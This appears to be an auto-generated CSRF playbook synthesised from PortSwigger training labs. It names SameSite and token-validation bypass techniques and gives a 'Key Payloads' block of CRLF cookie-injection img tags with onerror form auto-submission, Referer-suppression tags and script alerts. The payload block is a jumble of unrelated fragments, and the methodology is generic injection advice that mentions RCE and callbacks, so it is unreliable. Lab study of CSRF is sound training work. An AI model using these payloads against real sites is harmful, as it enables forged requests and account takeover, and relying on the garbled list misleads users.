## CSRF Playbook
*Synthesized from 12 PortSwigger labs*

### Overview
This playbook covers 12 known attack techniques for csrf.

### Attack Techniques

**Bypass Techniques:**
- SameSite Lax bypass via method override
- SameSite Strict bypass via client-side redirect
- SameSite Lax bypass via cookie refresh
- SameSite Strict bypass via sibling domain

**General:**
- CSRF with broken Referer validation
- CSRF where Referer validation depends on header being present
- CSRF where token is duplicated in cookie
- CSRF where token is not tied to user session
- CSRF where token is tied to non-session cookie
- CSRF where token validation depends on request method
- CSRF where token validation depends on token being present
- CSRF vulnerability with no defenses

### Key Payloads
```
<img src="https://[LAB_ID].[TARGET]/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
submit
history.pushState("", "", "/?[LAB_ID].[TARGET]")
Invalid username
GET /chat
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
csrf
Referrer-Policy: unsafe-url
session
postId
<script>alert(1)</script>
[TARGET_USER]:montoya
<meta name="referrer" content="no-referrer">
POST /my-account/change-email
_method
alert(1)
cms-[LAB_ID].[TARGET]
<img src="https://[LAB_ID].[TARGET]/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
csrfKey
<script>
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

